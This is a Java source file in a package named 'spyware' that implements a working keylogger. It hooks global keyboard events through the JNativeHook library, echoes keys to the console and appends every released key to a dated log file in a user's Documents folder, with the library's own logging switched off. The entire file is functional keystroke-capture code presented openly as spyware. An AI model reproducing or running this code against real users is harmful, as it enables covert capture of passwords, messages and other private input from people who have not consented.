package spyware;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.time.LocalDate;
import java.time.format.DateTimeFormatter;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class Keylogger  implements NativeKeyListener{
	
	 private static String LOG_FILE_PATH;
	 private static LocalDate currentDate;
	 
	 static {
	        updateLogFilePath();
	    }
	
	 private static void updateLogFilePath() {
	        currentDate = LocalDate.now();
	        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd");
	        LOG_FILE_PATH = "C:\\Users\\User\\Documents\\logs\\log-" + currentDate.format(formatter) + ".txt";
	    }

	    @Override
	    public void nativeKeyPressed(NativeKeyEvent e) {
	        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));

	        // If the Escape key is pressed, unregister the native hook
	        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
	            try {
	                GlobalScreen.unregisterNativeHook();
	            } catch (NativeHookException nativeHookException) {
	                nativeHookException.printStackTrace();
	            }
	        }
	    }

	    @Override
	    public void nativeKeyReleased(NativeKeyEvent e) {
	        System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
	        
	        // Write the key release event to the log file
	        try (BufferedWriter writer = new BufferedWriter(new FileWriter(LOG_FILE_PATH, true))) {
	            writer.write(NativeKeyEvent.getKeyText(e.getKeyCode()));
	            writer.newLine(); // Add a new line after each key event
	            System.out.println("Log file updated successfully!");
	        } catch (IOException ioException) {
	            ioException.printStackTrace();
	        }
	        
	        if (!LocalDate.now().equals(currentDate)) {
	            updateLogFilePath();
	        }
	    }

	    @Override
	    public void nativeKeyTyped(NativeKeyEvent e) {
	        System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
	        if (!LocalDate.now().equals(currentDate)) {
	            updateLogFilePath();
	        }
	    }

	    public static void main(String[] args) {
	        // Disable the library's default logging to avoid cluttering the console
	        java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
	        logger.setLevel(java.util.logging.Level.OFF);

	        try {
	            // Register the native hook to capture global key events
	            GlobalScreen.registerNativeHook();
	        } catch (NativeHookException ex) {
	            System.err.println("There was a problem registering the native hook.");
	            System.err.println(ex.getMessage());
	            System.exit(1);
	        }

	        // Add the keylogger as a native key listener
	        GlobalScreen.addNativeKeyListener(new Keylogger());
	    }
	}